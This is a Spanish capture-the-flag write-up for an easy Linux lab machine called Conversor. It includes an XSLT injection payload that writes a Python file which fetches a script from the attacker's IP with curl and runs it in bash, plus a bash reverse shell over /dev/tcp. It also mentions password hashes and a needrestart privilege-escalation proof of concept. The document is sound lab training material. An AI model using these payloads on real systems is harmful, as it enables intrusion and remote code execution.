Dificultad: Easy
IP: 10.10.11.92
OS: Linux 

# Escaneo

### Ping

![[Pasted image 20251030173352.png]]

### Nmap

![[Pasted image 20251030174112.png]]

Vemos los puertos 22 y 80 abiertos

(AGREGAMOS 10.10.11.92         conversor.htb  a /etc/hosts)

# Pagina web

Cuando nos registramos y nos loggeamos vemos lo siguiente:

![[Pasted image 20251030174534.png]]

viendo que podemos subir xml, podemos intentar hacer un XXE, pero no funcionó, tampoco el XXE en XSLT, si miramos mas la app, encontramos que en la parte de `/about` está el codigo fuente de la pagina, allí podemos encontrar que en `/var/www/conversor.htb/scripts` se ejecutan todos los archivos de python que estén ahí, por lo que podemos buscar alguna vulnerabilidad que nos permita subir archivos a una ruta especifica, en app.py no encontramos nada  especial, pero buscando en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection), vemos que podemos escribir archivos usando EXSLT, es importante tener cuidado con el codigo de pytho que pongamos por el tema de las tabulaciones y los espacios, mejor dejar todo pegado a la pared de la siguiente forma:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common" 
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/evil.py" method="text">
import os
os.system("curl http://10.10.14.221:1234/revershell.sh | bash")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

Iniciamos un servidor con una reverseshell.sh:

```shell
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/{nuestraIP}/{PUERTO} 0>&1'
```

# Acceso a user flag:

Podemos encontrar hashes en el archivo users.db dentro de la carpeta instance
# Escalada de privilegios

![[Pasted image 20251030183722.png]]

vemos que está disponible needrestart, y encontramos un poc, el cual podemos usar para explotar esta vulnerabilidad de una forma sencila  










